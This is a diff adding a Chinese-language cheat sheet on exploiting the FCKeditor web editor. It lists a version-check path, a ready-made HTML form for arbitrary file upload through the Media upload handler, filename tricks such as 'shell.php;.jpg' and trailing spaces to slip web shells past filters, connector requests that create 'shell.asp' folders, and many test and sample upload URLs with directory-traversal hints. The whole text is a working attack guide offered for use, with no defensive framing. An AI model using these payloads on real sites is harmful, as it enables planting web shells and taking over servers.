@@ -1,0 +1,64 @@
+最全的Fckeditor漏洞总结
+Fckeditor漏洞利用总结
+1.查看编辑器版本
+FCKeditor/_whatsnew.html
+—————————————————————————————————————————————————————————————
+
+2. Version 2.2 版本
+Apache+linux 环境下在上传文件后面加个.突破！测试通过。
+—————————————————————————————————————————————————————————————
+
+3.Version <=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，
+
+修改action地址。
+<form id=”frmUpload” enctype=”multipart/form-data”
+action=”http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media” method=”post”>Upload a new file:<br>
+<input type=”file” name=”NewFile” size=”50″><br>
+<input id=”btnUpload” type=”submit” value=”Upload”>
+</form>
+—————————————————————————————————————————————————————————————
+
+
+4.FCKeditor 文件上传“.”变“_”下划线的绕过方法
+很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。
+4.1：提交shell.php+空格绕过
+不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试。
+4.2：继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。
+—————————————————————————————————————————————————————————————
+
+5. 突破建立文件夹
+FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=
+
+%2Fshell.asp&NewFolderName=z&uuid=1244789975684
+FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?
+
+Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp
+—————————————————————————————————————————————————————————————
+
+6. FCKeditor 中test 文件的上传地址
+FCKeditor/editor/filemanager/browser/default/connectors/test.html
+FCKeditor/editor/filemanager/upload/test.html
+FCKeditor/editor/filemanager/connectors/test.html
+FCKeditor/editor/filemanager/connectors/uploadtest.html
+—————————————————————————————————————————————————————————————
+
+7.常用上传地址
+FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
+FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
+FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com%2Ffckeditor%2Feditor
+
+%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)
+JSP 版：
+FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp
+注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文
+件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。
+—————————————————————————————————————————————————————————————
+
+8.其他上传地址
+FCKeditor/_samples/default.html
+FCKeditor/_samples/asp/sample01.asp
+FCKeditor/_samples/asp/sample02.asp
+FCKeditor/_samples/asp/sample03.asp
+FCKeditor/_samples/asp/sample04.asp
+一般很多站点都已删除_samples 目录，可以试试。
+FCKeditor/editor/fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。
